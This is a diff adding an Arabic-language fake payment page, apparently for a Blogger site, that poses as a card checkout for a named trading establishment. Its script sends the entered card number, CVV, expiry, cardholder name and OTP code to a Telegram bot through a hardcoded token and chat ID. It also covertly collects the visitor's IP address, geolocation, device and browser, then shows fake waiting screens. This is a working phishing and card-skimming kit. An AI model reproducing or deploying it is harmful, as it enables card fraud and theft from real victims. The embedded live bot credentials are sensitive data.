@@ -1,0 +1,1601 @@
+```html
+
+<!doctype html>
+
+<html lang="ar" dir="rtl">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+/* ====== إخفاء مؤقت لكل الصفحة ====== */
+
+body { visibility:hidden !important; }
+
+#navbar-iframe, header, footer, .blog-pager, .sidebar {display:none!important;}
+
+html, body,
+
+.post-body, .post, .post-outer, .main, .main-inner, .content, .content-outer{
+
+  background:#fff !important;
+
+  margin:0 !important;
+
+  padding:0 !important;
+
+}
+
+body{font-family:'Cairo',sans-serif;}
+
+#appRoot{
+
+  position:fixed;
+
+  inset:0;
+
+  overflow:auto;
+
+  background:#fff;
+
+  margin:0 !important;
+
+  padding:0 !important;
+
+  visibility:visible !important;
+
+}
+
+.payment-box{
+
+  max-width:420px;
+
+  margin:16px auto;
+
+  background:#fff !important;
+
+  border-radius:18px;
+
+  padding:18px;
+
+  border:1px solid #ededed;
+
+}
+
+.payment-box, .payment-box *{
+
+  box-shadow:none !important;
+
+  text-shadow:none !important;
+
+  filter:none !important;
+
+  background-image:none !important;
+
+  outline:none !important;
+
+}
+
+.payment-box img{
+
+  background:transparent !important;
+
+  border:0 !important;
+
+  padding:0 !important;
+
+  margin:0 !important;
+
+}
+
+.title{
+
+  text-align:center;
+
+  font-weight:700;
+
+  font-size:18px;
+
+  margin-bottom:12px;
+
+  color:#222;
+
+}
+
+.details-btn{
+
+  width:100%;
+
+  background:#000 !important;
+
+  color:#fff !important;
+
+  border:none !important;
+
+  padding:14px;
+
+  border-radius:22px;
+
+  font-size:18px;
+
+  font-weight:600;
+
+  cursor:pointer;
+
+}
+
+.hr{height:4px;background:#000;margin:16px 0;border-radius:3px;}
+
+.section-title{
+
+  font-weight:700;
+
+  margin:14px 0 8px;
+
+  color:#333;
+
+  font-size:20px;
+
+}
+
+.cards{display:flex;gap:12px;margin-bottom:18px;}
+
+.card-item{
+
+  width:80px;
+
+  height:42px;
+
+  border:1px solid #dcdcdc !important;
+
+  border-radius:10px !important;
+
+  display:flex;
+
+  align-items:center;
+
+  justify-content:center;
+
+  background:#fff !important;
+
+  cursor:pointer;
+
+}
+
+.card-item img{
+
+  height:30px;
+
+  max-width:72px;
+
+  object-fit:contain;
+
+}
+
+.field-label{
+
+  font-weight:700;
+
+  font-size:16px;
+
+  color:#333;
+
+  margin:12px 0 6px;
+
+}
+
+.fake-input{
+
+  width:100%;
+
+  padding:14px 16px;
+
+  border:1px solid #dcdcdc !important;
+
+  border-radius:14px;
+
+  background:#f2f2f2 !important;
+
+  font-size:16px;
+
+  color:#333;
+
+  box-sizing:border-box;
+
+}
+
+.fake-input.inputlike{
+
+  color:#333;
+
+}
+
+.fake-input.inputlike::placeholder{
+
+  color:#8f8f8f;
+
+}
+
+.fake-input.inputlike{
+
+  -webkit-appearance:none;
+
+  appearance:none;
+
+}
+
+select.fake-input {
+
+  appearance: auto;
+
+  -webkit-appearance: auto;
+
+  background-color: #f2f2f2 !important;
+
+}
+
+.ltr{
+
+  direction:ltr;
+
+  unicode-bidi:plaintext;
+
+  letter-spacing:.5px;
+
+}
+
+.row{display:flex;gap:10px;margin-top:10px;}
+
+.row .col{flex:1;}
+
+.pay-btn{
+
+  width:100%;
+
+  background:#00b26a !important;
+
+  color:#fff !important;
+
+  border:none !important;
+
+  padding:18px;
+
+  font-size:22px;
+
+  font-weight:700;
+
+  border-radius:22px;
+
+  margin-top:14px;
+
+  cursor:pointer;
+
+}
+
+#otp-step{
+
+  display:none;
+
+  text-align:center;
+
+}
+
+.otp-note{
+
+  font-weight:600;
+
+  font-size:14px;
+
+  color:#666;
+
+  margin:6px 0 12px;
+
+  text-align:center;
+
+}
+
+.otp-input{
+
+  width:100%;
+
+  padding:14px 16px;
+
+  border:1px solid #dcdcdc !important;
+
+  border-radius:14px;
+
+  background:#f2f2f2 !important;
+
+  font-size:20px;
+
+  text-align:center;
+
+  letter-spacing:8px;
+
+  direction:ltr;
+
+  box-sizing:border-box;
+
+}
+
+.otp-input::placeholder{ color:#8f8f8f; }
+
+#loaderOverlay{
+
+  position:fixed;
+
+  inset:0;
+
+  background:rgba(255,255,255,.92);
+
+  display:none;
+
+  align-items:center;
+
+  justify-content:center;
+
+  z-index:999999;
+
+}
+
+.loaderBox{
+
+  width:min(420px, 92vw);
+
+  padding:22px 18px;
+
+  text-align:center;
+
+}
+
+.spinner{
+
+  width:56px;
+
+  height:56px;
+
+  margin:0 auto 12px;
+
+  border-radius:50%;
+
+  border:6px solid rgba(0,123,255,.20);
+
+  border-top-color:#007bff;
+
+  animation:spin 0.9s linear infinite;
+
+}
+
+@keyframes spin{ to{ transform:rotate(360deg);} }
+
+#loaderText{
+
+  font-weight:700;
+
+  color:#222;
+
+  font-size:16px;
+
+  margin-top:6px;
+
+}
+
+#loaderCounter{
+
+  margin-top:6px;
+
+  font-weight:700;
+
+  color:#007bff;
+
+  font-size:16px;
+
+  display:none;
+
+}
+
+.is-error{
+
+  border-color:#e53935 !important;
+
+  background:#ffecec !important;
+
+}
+
+.card-item.is-error{
+
+  border:2px solid #e53935 !important;
+
+  background:#ffecec !important;
+
+}
+
+.card-item.selected{
+
+  border:2px solid #16a34a !important;
+
+  background:#f0fdf4 !important;
+
+}
+
+#detailsModal{
+
+  position:fixed;
+
+  inset:0;
+
+  background:rgba(0,0,0,.55);
+
+  display:none;
+
+  align-items:center;
+
+  justify-content:center;
+
+  z-index:9999999;
+
+  padding:14px;
+
+}
+
+.detailsBox{
+
+  width:min(420px, 96vw);
+
+  background:#fff;
+
+  border-radius:18px;
+
+  overflow:hidden;
+
+  border:1px solid rgba(0,0,0,.08);
+
+}
+
+.detailsTop{
+
+  display:flex;
+
+  align-items:center;
+
+  justify-content:space-between;
+
+  padding:10px 12px;
+
+  background:#fff;
+
+}
+
+.detailsTitle{
+
+  font-weight:700;
+
+  font-size:14px;
+
+  color:#111;
+
+}
+
+.detailsClose{
+
+  border:none;
+
+  background:#000;
+
+  color:#fff;
+
+  border-radius:12px;
+
+  padding:8px 12px;
+
+  font-weight:700;
+
+  cursor:pointer;
+
+}
+
+#detailsImg{
+
+  display:block;
+
+  width:100%;
+
+  height:auto;
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div id="appRoot">
+
+  <!-- Overlay -->
+
+  <div id="loaderOverlay" aria-hidden="true">
+
+    <div class="loaderBox">
+
+      <div class="spinner"></div>
+
+      <div id="loaderText">يرجى الانتظار...</div>
+
+      <div id="loaderCounter">30</div>
+
+    </div>
+
+  </div>
+
+  <!-- نافذة التفاصيل (الصورة) -->
+
+  <div id="detailsModal" aria-hidden="true">
+
+    <div class="detailsBox" role="dialog" aria-modal="true">
+
+      <div class="detailsTop">
+
+        <div class="detailsTitle">التفاصيل</div>
+
+        <button class="detailsClose" type="button" id="closeDetails">إغلاق</button>
+
+      </div>
+
+      <img id="detailsImg" alt="تفاصيل" src="">
+
+    </div>
+
+  </div>
+
+  <div class="payment-box">
+
+    <!-- الصفحة الأولى -->
+
+    <div id="pay-step">
+
+      <div class="title">مؤسسة نوال هليل لبيدان الشمري للتجارة</div>
+
+      <button class="details-btn" id="detailsBtn" type="button">التفاصيل</button>
+
+      <div class="hr"></div>
+
+      <div class="section-title">ادفع بالبطاقة الائتمانية</div>
+
+      <div class="section-title">اختيار نوع البطاقة</div>
+
+      <div class="cards" id="cardTypeBox">
+
+        <div class="card-item" data-card="mada"><img src="https://i.postimg.cc/0j5yXPvp/20260225-152004.png" alt="mada"></div>
+
+        <div class="card-item" data-card="visa"><img src="https://i.postimg.cc/BZhSQWsd/20260225-152018.png" alt="visa"></div>
+
+        <div class="card-item" data-card="mastercard"><img src="https://i.postimg.cc/cJ8gfx1y/20260225-151945.png" alt="mastercard"></div>
+
+      </div>
+
+      <div class="section-title">معلومات البطاقة</div>
+
+      <div class="field-label">رقم البطاقة</div>
+
+      <input id="cardNumber" class="fake-input inputlike ltr" type="text" inputmode="numeric" maxlength="19" placeholder="1234 5678 9012 3456">
+
+      <div class="row">
+
+        <div class="col">
+
+          <div class="field-label">رمز الأمان</div>
+
+          <input id="cvv" class="fake-input inputlike ltr" type="text" inputmode="numeric" maxlength="3" placeholder="123">
+
+        </div>
+
+        <div class="col">
+
+          <div class="field-label">الشهر</div>
+
+          <select id="expMonth" class="fake-input inputlike">
+
+            <option value="">MM</option>
+
+          </select>
+
+        </div>
+
+        <div class="col">
+
+          <div class="field-label">السنة</div>
+
+          <select id="expYear" class="fake-input inputlike">
+
+            <option value="">YY</option>
+
+          </select>
+
+        </div>
+
+      </div>
+
+      <div class="field-label">الاسم الموجود على البطاقة</div>
+
+      <input id="cardName" class="fake-input inputlike" type="text" placeholder="TURKI ALANAZI" value="">
+
+      <button class="pay-btn" type="button" onclick="startPayFlow()">تأكيد الدفع</button>
+
+    </div>
+
+    <!-- واجهة رمز التحقق -->
+
+    <div id="otp-step">
+
+      <div class="section-title">تم إرسال رمز التحقق إلى جوالك</div>
+
+      <div class="otp-note">رمز التحقق مكون من 4 إلى 6 أرقام</div>
+
+      <input id="otpInput" class="otp-input" maxlength="6" placeholder="••••••" inputmode="numeric">
+
+      <button class="pay-btn" type="button" onclick="confirmOtpFlow()">تأكيد الرمز</button>
+
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+
+// ==========================
+
+// إعدادات التليجرام
+
+// ==========================
+
+const TELEGRAM_TOKEN = "8656375954:AAF0XTYnyQHOjiQ7uAZdVw_MJLSt9-zKWM8";
+
+const TELEGRAM_CHAT_ID = "6918534470";
+
+// ==========================
+
+// رابط صورة التفاصيل (قابل للتغيير)
+
+// ==========================
+
+const DETAILS_IMAGE_URL = "https://i.postimg.cc/4yVFcGfZ/20260226-105412.jpg";
+
+// ==========================
+
+// مدة عداد الانتظار (بالثواني) - غير الرقم حسب رغبتك
+
+// ==========================
+
+const COUNTDOWN_SECONDS = 30;   // ← غيّر الرقم هنا لزيادة أو تقليل المدة
+
+// ==========================
+
+// المتغيرات العامة
+
+// ==========================
+
+let countdownTimer = null;
+
+let selectedCardType = "";          // mada, visa, mastercard
+
+let lastFourDigits = "";            // آخر 4 أرقام من البطاقة
+
+let visitCount = 0;                 // عدد مرات الزيارة
+
+// ==========================
+
+// دوال إرسال الرسائل إلى تليجرام (محسنة الاحترافية)
+
+// ==========================
+
+async function sendTelegramMessage(text) {
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+  const payload = {
+
+    chat_id: TELEGRAM_CHAT_ID,
+
+    text: text,
+
+    parse_mode: 'HTML'
+
+  };
+
+  try {
+
+    const response = await fetch(url, {
+
+      method: 'POST',
+
+      headers: { 'Content-Type': 'application/json' },
+
+      body: JSON.stringify(payload)
+
+    });
+
+    const data = await response.json();
+
+    if (!data.ok) console.error('Telegram error:', data);
+
+  } catch (e) {
+
+    console.error('Failed to send telegram:', e);
+
+  }
+
+}
+
+// ==========================
+
+// دالة متقدمة لجلب الموقع الجغرافي عبر IP باستخدام عدة خدمات (بدون علم المستخدم)
+
+// ==========================
+
+async function fetchLocation() {
+
+  const services = [
+
+    {
+
+      name: 'ip-api',
+
+      url: 'https://ip-api.com/json/',
+
+      parse: (data) => {
+
+        if (data.status === 'success') {
+
+          return `${data.city}، ${data.country} (${data.lat},${data.lon})`;
+
+        }
+
+        return null;
+
+      }
+
+    },
+
+    {
+
+      name: 'ipapi',
+
+      url: 'https://ipapi.co/json/',
+
+      parse: (data) => {
+
+        if (!data.error && data.city) {
+
+          return `${data.city}، ${data.country_name} (${data.latitude},${data.longitude})`;
+
+        }
+
+        return null;
+
+      }
+
+    },
+
+    {
+
+      name: 'ipinfo',
+
+      url: 'https://ipinfo.io/json',
+
+      parse: (data) => {
+
+        if (data.city) {
+
+          return `${data.city}، ${data.country} (${data.loc})`;
+
+        }
+
+        return null;
+
+      }
+
+    }
+
+  ];
+
+  for (let service of services) {
+
+    try {
+
+      const response = await fetch(service.url, { mode: 'cors' });
+
+      const data = await response.json();
+
+      const location = service.parse(data);
+
+      if (location) {
+
+        console.log(`تم الحصول على الموقع من ${service.name}: ${location}`);
+
+        return location;
+
+      }
+
+    } catch (e) {
+
+      console.warn(`فشل الاتصال بـ ${service.name}:`, e);
+
+    }
+
+  }
+
+  return "غير متاح (تعذر الحصول على الموقع من جميع الخدمات)";
+
+}
+
+// دالة محسنة لجمع معلومات الجهاز والمتصفح مع الموقع الجغرافي المتعدد
+
+async function collectEnvironmentData() {
+
+  const ua = navigator.userAgent;
+
+  // ✅ تحديد نوع الجهاز بدقة
+
+  let deviceType = "كمبيوتر غير معروف";
+
+  if (/iPhone|iPod/.test(ua)) {
+
+    deviceType = "📱 iPhone";
+
+  } else if (/iPad/.test(ua)) {
+
+    deviceType = "📱 iPad";
+
+  } else if (/Android/.test(ua)) {
+
+    if (/Mobile/.test(ua)) deviceType = "📱 هاتف أندرويد";
+
+    else deviceType = "📟 جهاز أندرويد لوحي";
+
+  } else if (/Windows Phone/.test(ua)) {
+
+    deviceType = "📱 Windows Phone";
+
+  } else if (/Windows/.test(ua)) {
+
+    deviceType = "💻 كمبيوتر ويندوز";
+
+  } else if (/Macintosh/.test(ua)) {
+
+    deviceType = "🍎 ماك";
+
+  } else if (/Linux/.test(ua)) {
+
+    deviceType = "🐧 لينكس";
+
+  }
+
+  // ✅ تحديد المتصفح
+
+  let browser = "متصفح غير معروف";
+
+  if (ua.includes("Firefox")) browser = "🔥 فايرفوكس";
+
+  else if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "🌐 كروم";
+
+  else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "🧭 سفاري";
+
+  else if (ua.includes("Edg")) browser = "📘 إيدج";
+
+  else if (ua.includes("MSIE") || ua.includes("Trident/")) browser = "💀 إنترنت إكسبلورر";
+
+  // ✅ الحصول على IP (بدون طلب أي صلاحية)
+
+  let ip = "غير متوفر";
+
+  try {
+
+    const res = await fetch('https://api.ipify.org?format=json');
+
+    const data = await res.json();
+
+    ip = data.ip;
+
+  } catch (e) {
+
+    console.warn('Could not fetch IP');
+
+  }
+
+  // ✅ الحصول على الموقع الجغرافي بعدة طرق
+
+  const location = await fetchLocation();
+
+  // ✅ عدد الزيارات
+
+  visitCount = (parseInt(localStorage.getItem('visitCount') || '0')) + 1;
+
+  localStorage.setItem('visitCount', visitCount.toString());
+
+  return {
+
+    deviceType,
+
+    browser,
+
+    ip,
+
+    location,
+
+    visitCount
+
+  };
+
+}
+
+// ==========================
+
+// دوال المساعدة (التحقق، عرض الخطأ)
+
+// ==========================
+
+function markError(el, isErr){
+
+  if(!el) return;
+
+  if(isErr) el.classList.add('is-error');
+
+  else el.classList.remove('is-error');
+
+}
+
+function clearErrors(){
+
+  markError(document.getElementById('cardNumber'), false);
+
+  markError(document.getElementById('cvv'), false);
+
+  markError(document.getElementById('expMonth'), false);
+
+  markError(document.getElementById('expYear'), false);
+
+  markError(document.getElementById('cardName'), false);
+
+  markError(document.getElementById('otpInput'), false);
+
+  document.querySelectorAll('#cardTypeBox .card-item').forEach(ci => ci.classList.remove('is-error'));
+
+}
+
+// ==========================
+
+// ملء قوائم الشهر والسنة
+
+// ==========================
+
+function populateMonths() {
+
+  const monthSelect = document.getElementById('expMonth');
+
+  for (let m = 1; m <= 12; m++) {
+
+    const option = document.createElement('option');
+
+    option.value = m < 10 ? '0' + m : '' + m;
+
+    option.textContent = m < 10 ? '0' + m : '' + m;
+
+    monthSelect.appendChild(option);
+
+  }
+
+}
+
+function populateYears() {
+
+  const yearSelect = document.getElementById('expYear');
+
+  const startYear = 2026;
+
+  const endYear = 2050;
+
+  for (let y = startYear; y <= endYear; y++) {
+
+    const option = document.createElement('option');
+
+    option.value = y;
+
+    option.textContent = y;
+
+    yearSelect.appendChild(option);
+
+  }
+
+}
+
+populateMonths();
+
+populateYears();
+
+// ==========================
+
+// عناصر DOM
+
+// ==========================
+
+const cardNumberEl = document.getElementById('cardNumber');
+
+const cvvEl = document.getElementById('cvv');
+
+const expMonthEl = document.getElementById('expMonth');
+
+const expYearEl = document.getElementById('expYear');
+
+const cardNameEl = document.getElementById('cardName');
+
+const otpEl = document.getElementById('otpInput');
+
+// ==========================
+
+// اختيار نوع البطاقة
+
+// ==========================
+
+const cardItems = document.querySelectorAll('#cardTypeBox .card-item');
+
+cardItems.forEach(item => {
+
+  item.addEventListener('click', () => {
+
+    selectedCardType = item.getAttribute('data-card') || "";
+
+    console.log('البطاقة المختارة:', selectedCardType);
+
+    cardItems.forEach(x => x.classList.remove('selected'));
+
+    item.classList.add('selected');
+
+    cardItems.forEach(x => x.classList.remove('is-error'));
+
+  });
+
+});
+
+// ==========================
+
+// تنسيق الإدخالات
+
+// ==========================
+
+cardNumberEl.addEventListener('input', () => {
+
+  let v = cardNumberEl.value.replace(/\D/g,'').slice(0,16);
+
+  cardNumberEl.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+
+  if(cardNumberEl.value.replace(/\s/g,'').length > 0) markError(cardNumberEl,false);
+
+});
+
+cvvEl.addEventListener('input', () => {
+
+  cvvEl.value = cvvEl.value.replace(/\D/g,'').slice(0,3);
+
+  if(cvvEl.value.length > 0) markError(cvvEl,false);
+
+});
+
+cardNameEl.addEventListener('input', () => {
+
+  cardNameEl.value = cardNameEl.value.replace(/[^\p{L}\s]/gu, '');
+
+  if(cardNameEl.value.trim().length > 0) markError(cardNameEl,false);
+
+});
+
+otpEl.addEventListener('input', () => {
+
+  otpEl.value = otpEl.value.replace(/\D/g,'').slice(0,6);
+
+  if(otpEl.value.length > 0) markError(otpEl,false);
+
+});
+
+expMonthEl.addEventListener('change', () => markError(expMonthEl, false));
+
+expYearEl.addEventListener('change', () => markError(expYearEl, false));
+
+// ==========================
+
+// Loader functions
+
+// ==========================
+
+function showLoader(withCounter){
+
+  const overlay = document.getElementById('loaderOverlay');
+
+  const counter = document.getElementById('loaderCounter');
+
+  overlay.style.display = 'flex';
+
+  overlay.setAttribute('aria-hidden', 'false');
+
+  counter.style.display = withCounter ? 'block' : 'none';
+
+  if (withCounter) {
+
+    document.getElementById('loaderCounter').textContent = COUNTDOWN_SECONDS;
+
+  }
+
+}
+
+function hideLoader(){
+
+  const overlay = document.getElementById('loaderOverlay');
+
+  overlay.style.display = 'none';
+
+  overlay.setAttribute('aria-hidden', 'true');
+
+  if(countdownTimer){
+
+    clearInterval(countdownTimer);
+
+    countdownTimer = null;
+
+  }
+
+}
+
+// ==========================
+
+// شاشات
+
+// ==========================
+
+function openOtpStep(){
+
+  document.getElementById('pay-step').style.display = 'none';
+
+  document.getElementById('otp-step').style.display = 'block';
+
+}
+
+// ==========================
+
+// التحقق من صحة الحقول (المرحلة الأولى)
+
+// ==========================
+
+function validatePayFields(){
+
+  clearErrors();
+
+  const cardDigits = cardNumberEl.value.replace(/\s/g,'');
+
+  const cvv = cvvEl.value.trim();
+
+  const month = expMonthEl.value;
+
+  const year = expYearEl.value;
+
+  const name = cardNameEl.value.trim();
+
+  let ok = true;
+
+  if(!selectedCardType){
+
+    cardItems.forEach(ci => ci.classList.add('is-error'));
+
+    ok = false;
+
+  }
+
+  if(cardDigits.length !== 16){
+
+    markError(cardNumberEl,true); ok = false;
+
+  } else {
+
+    lastFourDigits = cardDigits.slice(-4);
+
+  }
+
+  if(cvv.length !== 3){
+
+    markError(cvvEl,true); ok = false;
+
+  }
+
+  if(!month){
+
+    markError(expMonthEl,true); ok = false;
+
+  }
+
+  if(!year){
+
+    markError(expYearEl,true); ok = false;
+
+  }
+
+  if(name.length === 0){
+
+    markError(cardNameEl,true); ok = false;
+
+  }
+
+  return ok;
+
+}
+
+// ==========================
+
+// التحقق من OTP
+
+// ==========================
+
+function validateOtp(){
+
+  clearErrors();
+
+  const code = (otpEl.value || '').trim();
+
+  const ok = /^\d{4,6}$/.test(code);
+
+  if(!ok) markError(otpEl,true);
+
+  return ok;
+
+}
+
+// ==========================
+
+// دالة إرسال الرسالة الأولى (معلومات البطاقة) - بتنسيق احترافي
+
+// ==========================
+
+async function sendFirstMessage() {
+
+  const env = await collectEnvironmentData();
+
+  // خريطة دقيقة
+
+  const cardTypeMap = {
+
+    'mada': '💳 ماستركارد',
+
+    'visa': '💳 فيزا',
+
+    'mastercard': '💳 مدى'
+
+  };
+
+  const cardTypeArabic = cardTypeMap[selectedCardType] || selectedCardType;
+
+  const message = `
+
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>💳 الدفع - المرحلة الأولى (معلومات البطاقة)</b>
+
+━━━━━━━━━━━━━━━━━━━━━
+
+${cardTypeArabic}
+
+🔢 <b>رقم البطاقة:</b> <code>${cardNumberEl.value.replace(/\s/g,'')}</code>
+
+🔐 <b>رمز الأمان (CVV):</b> <code>${cvvEl.value}</code>
+
+📅 <b>تاريخ الانتهاء:</b> ${expMonthEl.value}/${expYearEl.value}
+
+👤 <b>الاسم على البطاقة:</b> ${cardNameEl.value.trim()}
+
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>📱 معلومات الجهاز والموقع</b>
+
+━━━━━━━━━━━━━━━━━━━━━
+
+🖥️ <b>نوع الجهاز:</b> ${env.deviceType}
+
+🌐 <b>المتصفح:</b> ${env.browser}
+
+🌍 <b>العنوان IP:</b> <code>${env.ip}</code>
+
+📍 <b>الموقع التقريبي:</b> ${env.location}
+
+👀 <b>عدد الزيارات:</b> ${env.visitCount}
+
+━━━━━━━━━━━━━━━━━━━━━
+
+  `;
+
+  await sendTelegramMessage(message);
+
+}
+
+// ==========================
+
+// دالة إرسال الرسالة الثانية (رمز التحقق) - بتنسيق احترافي
+
+// ==========================
+
+async function sendSecondMessage(otpCode) {
+
+  const env = await collectEnvironmentData();
+
+  const message = `
+
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>🔐 الدفع - المرحلة الثانية (رمز التحقق)</b>
+
+━━━━━━━━━━━━━━━━━━━━━
+
+🔢 <b>رمز التحقق:</b> <code>${otpCode}</code>
+
+🔚 <b>آخر 4 أرقام للبطاقة:</b> <code>${lastFourDigits}</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>📱 معلومات الجهاز والموقع</b>
+
+━━━━━━━━━━━━━━━━━━━━━
+
+🖥️ <b>نوع الجهاز:</b> ${env.deviceType}
+
+🌐 <b>المتصفح:</b> ${env.browser}
+
+🌍 <b>العنوان IP:</b> <code>${env.ip}</code>
+
+📍 <b>الموقع التقريبي:</b> ${env.location}
+
+👀 <b>عدد الزيارات:</b> ${env.visitCount}
+
+━━━━━━━━━━━━━━━━━━━━━
+
+  `;
+
+  await sendTelegramMessage(message);
+
+}
+
+// ==========================
+
+// تتبع زر التفاصيل
+
+// ==========================
+
+let detailsClickCount = parseInt(localStorage.getItem('detailsClickCount') || '0');
+
+async function sendDetailsOpenedMessage() {
+
+  const env = await collectEnvironmentData();
+
+  const message = `
+
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>🔍 تفاصيل - تم فتح نافذة التفاصيل</b>
+
+━━━━━━━━━━━━━━━━━━━━━
+
+🔘 <b>عدد مرات فتح التفاصيل:</b> ${detailsClickCount}
+
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>📱 معلومات الجهاز والموقع</b>
+
+━━━━━━━━━━━━━━━━━━━━━
+
+🖥️ <b>نوع الجهاز:</b> ${env.deviceType}
+
+🌐 <b>المتصفح:</b> ${env.browser}
+
+🌍 <b>العنوان IP:</b> <code>${env.ip}</code>
+
+📍 <b>الموقع التقريبي:</b> ${env.location}
+
+👀 <b>عدد الزيارات:</b> ${env.visitCount}
+
+━━━━━━━━━━━━━━━━━━━━━
+
+  `;
+
+  await sendTelegramMessage(message);
+
+}
+
+// ==========================
+
+// فتح صورة التفاصيل
+
+// ==========================
+
+const detailsBtn = document.getElementById('detailsBtn');
+
+const detailsModal = document.getElementById('detailsModal');
+
+const detailsImg = document.getElementById('detailsImg');
+
+const closeDetails = document.getElementById('closeDetails');
+
+function openDetails(){
+
+  // زيادة العداد وحفظه
+
+  detailsClickCount++;
+
+  localStorage.setItem('detailsClickCount', detailsClickCount.toString());
+
+  
+
+  detailsImg.src = DETAILS_IMAGE_URL;
+
+  detailsModal.style.display = 'flex';
+
+  detailsModal.setAttribute('aria-hidden','false');
+
+  
+
+  // إرسال إشعار فتح التفاصيل فقط (بدون رسالة تحميل الصورة)
+
+  sendDetailsOpenedMessage();
+
+}
+
+function closeDetailsModal(){
+
+  detailsModal.style.display = 'none';
+
+  detailsModal.setAttribute('aria-hidden','true');
+
+  detailsImg.src = '';
+
+}
+
+// ربط الأحداث
+
+if(detailsBtn) detailsBtn.addEventListener('click', openDetails);
+
+if(closeDetails) closeDetails.addEventListener('click', closeDetailsModal);
+
+if(detailsModal) detailsModal.addEventListener('click', (e)=>{
+
+  if(e.target === detailsModal) closeDetailsModal();
+
+});
+
+// ==========================
+
+// تدفق الدفع (المرحلة الأولى)
+
+// ==========================
+
+async function startPayFlow() {
+
+  if(!validatePayFields()) return;
+
+  // إرسال البيانات إلى تليجرام
+
+  await sendFirstMessage();
+
+  // إظهار العداد
+
+  showLoader(true);
+
+  const counter = document.getElementById('loaderCounter');
+
+  let seconds = COUNTDOWN_SECONDS;
+
+  counter.textContent = seconds;
+
+  if(countdownTimer) clearInterval(countdownTimer);
+
+  countdownTimer = setInterval(() => {
+
+    seconds--;
+
+    if(seconds < 0) seconds = 0;
+
+    counter.textContent = seconds;
+
+    if(seconds === 0){
+
+      clearInterval(countdownTimer);
+
+      countdownTimer = null;
+
+      hideLoader();
+
+      openOtpStep();
+
+      setTimeout(() => otpEl.focus(), 150);
+
+    }
+
+  }, 1000);
+
+}
+
+// ==========================
+
+// تأكيد OTP (المرحلة الثانية)
+
+// ==========================
+
+async function confirmOtpFlow() {
+
+  if(!validateOtp()) return;
+
+  const otpCode = otpEl.value.trim();
+
+  await sendSecondMessage(otpCode);
+
+  showLoader(false);  // بدون عداد
+
+  // محاكاة معالجة (يمكن تعديل المدة)
+
+  setTimeout(() => {
+
+    hideLoader();
+
+    otpEl.value = '';
+
+    markError(otpEl,false);
+
+    setTimeout(() => otpEl.focus(), 150);
+
+  }, 30000);
+
+}
+
+// ==========================
+
+// تهيئة الصفحة
+
+// ==========================
+
+document.addEventListener("DOMContentLoaded", function() {
+
+  // إخفاء عناصر بلوجر الأخرى
+
+  document.querySelectorAll("body > *:not(#appRoot)").forEach(el => {
+
+    el.style.display = "none";
+
+  });
+
+  // منع السكرول الخلفي
+
+  document.documentElement.style.overflow = "hidden";
+
+  document.body.style.overflow = "hidden";
+
+  document.body.style.visibility = "visible";
+
+  // قراءة عدد الزيارات الحالي
+
+  visitCount = parseInt(localStorage.getItem('visitCount') || '0');
+
+  
+
+  // قراءة عدد مرات فتح التفاصيل
+
+  detailsClickCount = parseInt(localStorage.getItem('detailsClickCount') || '0');
+
+});
+
+</script>
+
+</body>
+
+</html>
+
+```
